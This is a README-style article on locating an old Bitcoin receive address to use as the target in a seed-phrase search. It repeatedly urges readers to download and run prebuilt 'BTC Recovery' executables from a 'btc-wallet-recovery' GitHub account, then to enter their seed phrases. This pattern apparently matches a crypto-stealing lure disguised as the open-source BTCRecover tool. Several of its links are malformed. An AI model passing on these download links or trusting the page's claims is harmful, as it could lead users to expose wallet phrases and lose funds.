<div align="center">
<img src="assets/banner-article.png" alt="How to find a lost Bitcoin wallet address">
</div>

# How to find a lost Bitcoin wallet address

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A Bitcoin address is not a wallet and cannot rebuild one, but it is the anchor that makes a partial recovery checkable. BTCRecover tests candidate phrases against an address you already know belongs to the wallet, which is why finding one old receive address often turns "I have 11 of my 12 words" into a solvable problem.

## You'll see this if

You remember the wallet, or the coins, but not the string that proves either. The search for an address is really a search through your own records: an app you still have installed, an exchange statement, an old invoice, a screenshot, a tax export.

| What you have | Where the address usually still exists |
|---|---|
| The wallet app still installed on a phone or laptop | receive screen, or the transaction list  -  the first incoming payment shows it |
| An exchange withdrawal from years ago | exchange transaction history, confirmation email, CSV export |
| You were paid in Bitcoin | the invoice, the payment request email, a chat thread with the payer |
| A written backup with no address | derive addresses from the words you have; the first address of the account is the one to record |
| A hardware device with the seed | the device's receive screen, or the companion app's account list |
| Nothing but a memory of the balance | no address to work from  -  the route is identification, not lookup |

Two limits are worth stating before the steps. An address identifies an account, not a person, and it does not contain the keys  -  an address alone cannot be turned back into a phrase or a private key. And one wallet usually has many addresses, so the address you remember may be the tenth one it generated rather than the first.

## Why it happens

Wallets are deterministic: the phrase produces a tree of keys, and each key produces addresses. Modern wallets generate a new address for every payment, so a wallet with fifty transactions can hold fifty addresses that all belong to it and none of which look related.

That structure is what makes an address useful during recovery and useless on its own. Useful, because a candidate phrase can be turned into the same tree and compared against a known address  -  one match confirms the phrase. Useless alone, because the comparison only runs one way: address from phrase is arithmetic, phrase from address is not.

Wallet type sits underneath this. A phrase restored into the wrong wallet produces a different tree, so the addresses do not match even though the words are perfect. That is the ordinary explanation for a correct phrase that opens an empty wallet, and it is why the address has to be recorded together with the wallet that made it.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Work from your own records first, then from the software, then from the phrase  -  and record the address with the wallet name beside it, because the pair is what a search needs.

1. **Decide what the address is for.** If it is the validation target for a phrase search, one address from the account you want is enough. If it is for your own records, collect the first receive address and the current one.
2. **Search your records in date order.** Exchange withdrawal history is the richest source: it shows the address you sent to, with a date. Then confirmation emails, invoices, and any export you made for tax.
3. **Open the wallet if it still exists.** In a desktop wallet, the receive tab shows a current address and the transaction list shows the ones already used. In a mobile wallet, the same information sits under the asset's details.
4. **Derive from the words when there is no software left.** With most of a phrase, the tool can generate the first addresses of each account and you can compare them against a screenshot or a statement. [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md)
5. **Record the address with its wallet type and, if you know it, the account.** "Address X, from an Electrum wallet made in 2016" is usable. A bare string with no context is much weaker.
6. **Use it as the target.** In a seed search, the address is what each candidate is tested against; in a passphrase search it is what tells you whether the 25th word is right: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
7. **Check the address type matches the wallet.** Legacy, nested and native SegWit addresses come from different branches of the same wallet, and a target from the wrong branch fails against a correct phrase: [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md).

## If that did not work

When no record of an address survives, the recovery problem changes shape: there is nothing to validate candidates against, so the work moves to identifying the wallet and reconstructing the phrase's context instead.

Start with the wallet rather than the address. A known app, a known year and a known word count narrow the derivation more than a guessed address ever would. If the coins are old enough that the wallet software no longer exists in a usable form, the old-wallet route covers what usually survives  -  a file, a backup, a written phrase  -  and how to work from that. Where nothing at all survives, the honest answer is that the balance is unreachable and software cannot change it. [A recovery that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) is the checklist to run before concluding that.

## Prevention

- Write the first receive address next to each backup, with the wallet name and the year.
- Keep one inventory note listing every wallet you have ever used, even empty ones.
- Export exchange withdrawal history once a year; the address you need is usually in it.
- Label hardware-device backups with the account they belong to, not just the words.
- Photograph nothing that contains a phrase; an address is safe to store, a phrase is not.

BTCRecover is actively maintained, and the current release is published on the GitHub releases page.
## FAQ

### Can I recover a wallet from an address alone?

No. An address is a destination, not a key: it can confirm a candidate phrase when one is found, but it cannot generate one. Recovery needs something that produces keys  -  words, a file, or a password that unlocks that file.

### How do I find my old Bitcoin address?

Look in the wallet app's transaction list first, then in exchange withdrawal history for the date you moved the coins. Both record the address you used, and both are easier to search than a phrase you half-remember.

### Why does my address keep changing?

Most wallets generate a fresh address for each payment so that one address cannot be linked to your whole balance. All of those addresses still belong to the same wallet and the same phrase, which is why an old one is still a valid target.

### Which address should I use as the recovery target?

One you are certain belongs to the account you want, and one from the same address type the wallet used at the time. A receive address from the first transaction of that account is usually the safest choice: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) shows how the target is used in a missing-word search.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [Old wallets and Bitcoin from years ago]([Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md))
- [Can lost Bitcoin be recovered?]([Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md))
